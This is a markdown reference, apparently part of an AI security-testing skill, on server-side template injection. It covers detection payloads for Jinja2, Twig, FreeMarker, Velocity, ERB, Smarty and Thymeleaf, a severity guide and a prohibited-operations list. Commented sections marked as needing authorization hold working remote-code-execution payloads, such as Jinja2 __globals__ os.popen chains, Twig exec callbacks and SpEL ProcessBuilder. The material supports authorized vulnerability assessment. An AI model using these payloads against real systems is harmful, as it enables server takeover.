# SSTI (Server-Side Template Injection) Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized AppSec assessment reference** only, helping identify SSTI vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual RCE execution is prohibited
> - SSTI payloads are for understanding attack surface only, **no system control obtained**
> - Validation proves vulnerability existence (template expression executed), **no malicious code execution**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: Identify template engine first, then apply targeted payloads**

---

## Validation Objectives (Within Security Boundary)

SSTI vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Template Expression Test | ✓ Math expression (7*7) | - | RCE payload execution |
| Template Engine Identification | ✓ Error pattern analysis | - | Code execution |
| Safe Object Access | ✓ Access harmless objects | ✓ Access sensitive config | Credential extraction |
| RCE Capability Proof | ❌ Not by default | ✓ Requires explicit authorization | Malicious command execution |

**Safe Validation Method**: Use math expressions ({{7*7}}) to prove template execution; do not execute system commands without authorization.

---

## Template Engine Detection

### Basic Detection Payloads

```text
# Test if template engine processes expressions
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
@{7*7}
{{7*'7'}}  # Jinja2/Twig returns 7777777
${7*'7'}   # Velocity returns 7777777
```

### Engine Identification Matrix

| Payload | Result | Engine |
|---------|--------|--------|
| `{{7*7}}` | 49 | Jinja2, Twig, Nunjucks, AngularJS |
| `{{7*'7'}}` | 7777777 | Jinja2 |
| `{{7*'7'}}` | 49 | Twig |
| `${7*7}` | 49 | Velocity, FreeMarker, Thymeleaf |
| `${7*'7'}` | 7777777 | FreeMarker |
| `<%= 7*7 %>` | 49 | ERB (Ruby), JSP (Java) |
| `#{7*7}` | 49 | Ruby (Erubi), Crystal |
| `*{7*7}` | 49 | Thymeleaf |
| `{{constructor.constructor('alert(1)')()}}` | JS exec | AngularJS client-side |

### Error-based Detection

```text
# Trigger error to identify engine from error message
{{<invalid>}}
${<invalid>}
<%= <invalid %>

# Engine-specific errors
Jinja2: "TemplateSyntaxError" or "jinja2"
Twig: "Twig_Error_Syntax"
Velocity: "Parse error"
FreeMarker: "Error" or "freemarker"
ERB: "SyntaxError" or "erb"
```

---

## Jinja2 (Python - Flask/Django)

### Detection

```text
{{7*7}}           -> 49
{{7*'7'}}         -> 7777777
{{config}}        -> Config object (Flask)
{{self}}          -> Template reference
{{request}}       -> Request object
```

### Safe Object Access (Default)

```text
# Access harmless objects - proves template execution
{{config.items()}}
{{request.environ}}
{{self.__dict__}}
```

### ⚠️ RCE Payloads (Requires Authorization)

```python
# These payloads lead to RCE - require explicit authorization before use
# {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# {{request.application.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
# {{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['popen']('id').read()}}
```

---

## Twig (PHP - Symfony)

### Detection

```text
{{7*7}}           -> 49
{{7*'7'}}         -> 49 (not 7777777)
{{_self.env}}     -> Environment object
```

### Safe Object Access (Default)

```text
{{app.request}}
{{app.user}}
{{_self.env.registerUndefinedFilterCallback}}
```

### ⚠️ RCE Payloads (Requires Authorization)

```php
# {{_self.env.registerUndefinedFilterCallback("exec")}}
# {{_self.env.registerUndefinedFilterCallback("system")}}
# These lead to code execution - require authorization
```

---

## FreeMarker (Java)

### Detection

```text
${7*7}            -> 49
${7*'7'}          -> 7777777
${.now}           -> Date object
${.version}       -> FreeMarker version
```

### Safe Object Access (Default)

```text
${.current_template_name}
${.locale}
${request}
${session}
```

### ⚠️ RCE Payloads (Requires Authorization)

```text
# ${"freemarker.template.utility.Execute"?new()}
# These create Execute object for command execution - require authorization
```

---

## Velocity (Java)

### Detection

```text
$7*7              -> 49
#set($x=7*7)$x    -> 49
```

### Safe Object Access (Default)

```text
$request
$session
$response
```

---

## ERB / Ruby Templates

### Detection

```text
<%= 7*7 %>        -> 49
#{7*7}            -> 49 (Ruby interpolation)
```

### Safe Object Access (Default)

```text
<%= self %>
<%= request %>
<%= params %>
```

### ⚠️ RCE Payloads (Requires Authorization)

```ruby
# <%= system('id') %>
# <%= `id` %>
# <%= IO.popen('id').read() %>
# These execute commands - require authorization
```

---

## Smarty (PHP)

### Detection

```text
{$smarty.version}
{$7*7}
```

### Safe Object Access (Default)

```text
{$smarty.template}
{$smarty.config}
```

---

## Thymeleaf (Java - Spring)

### Detection

```text
${7*7}            -> Spring EL
*{7*7}            -> Selection variable
#{7*7}            -> Message expression
@{7*7}            -> Link expression
```

### ⚠️ Spring Expression Language (SpEL) RCE (Requires Authorization)

```text
# ${T(java.lang.System).getenv()}
# ${new java.lang.ProcessBuilder({'id'}).start()}
# SpEL can execute Java code - require authorization
```

---

## Analysis Process

1. Identify template rendering context from fingerprint (Flask -> Jinja2, Symfony -> Twig, Spring -> Thymeleaf)
2. Inject basic math expression (`{{7*7}}`, `${7*7}`)
3. Observe response: does expression evaluate to 49?
4. If yes, identify specific engine from error patterns or behavior differences
5. Test safe object access to confirm template context
6. **Stop validation**, confirm SSTI exists with engine identified
7. If RCE proof needed, obtain explicit authorization first

---

## Output

```markdown
## Vulnerability: SSTI (Server-Side Template Injection)

### Location
{URL} - {parameter/template context}

### Template Engine
{Jinja2/Twig/FreeMarker/Velocity/ERB/Thymeleaf}

### Proof Payload
{{7*7}} -> Response contains 49

### Validation Result
- Template expression executed: ✓ Yes
- Engine identified: {Jinja2}
- Math result: 49
- Object access: {config.items() accessible}

### Risk Level
{see severity rules}

### Severity Classification

SSTI must distinguish "**template injection exists**" from "**can actually RCE**". `7*7=49` echo only proves injection point exists, does not equal RCE — whether RCE is possible depends on whether sandbox is bypassable / whether dangerous functions/objects are exposed. **Must confirm RCE for High; otherwise Low.**

| Actual case | Severity | Note |
|---------|------|------|
| Explicit user authorization RCE verification, and code execution confirmed (RCE succeeds) | **High** | Sandbox bypassable / dangerous object reachable, RCE is real |
| Template injection confirmed (expression echo/object access), but RCE not verified (default testing scope) | **Low** | Injection point exists, but RCE capability not confirmed. Do not report High based on "config object accessible" — config access does not equal RCE |
| Injection point suspected (response anomaly but no stable echo) | Low | Pending confirmation |

**Boundary coordination**: This file prohibits RCE execution by default (RCE payloads require explicit authorization). Therefore within default testing scope SSTI always records Low. "Confirmed RCE = High" requires **explicit user authorization to execute RCE verification** (Tier 2); record High only after RCE succeeds within authorized scope, and document sandbox bypass technique and verification method. Without authorization, do not raise severity for "RCE possibility".
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ RCE execution | Do not execute system commands without authorization |
| ❌ Config extraction | Do not read sensitive configuration without authorization |
| ❌ Credential access | Do not access database passwords, API keys |
| ❌ File read via SSTI | Do not use template to read sensitive files |
| ❌ Reverse shell | Do not establish reverse connection |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Prove existence, do not enable harm"
- `SKILL.md` -> Action Policy -> "File upload, RCE, reverse shell | Do not execute"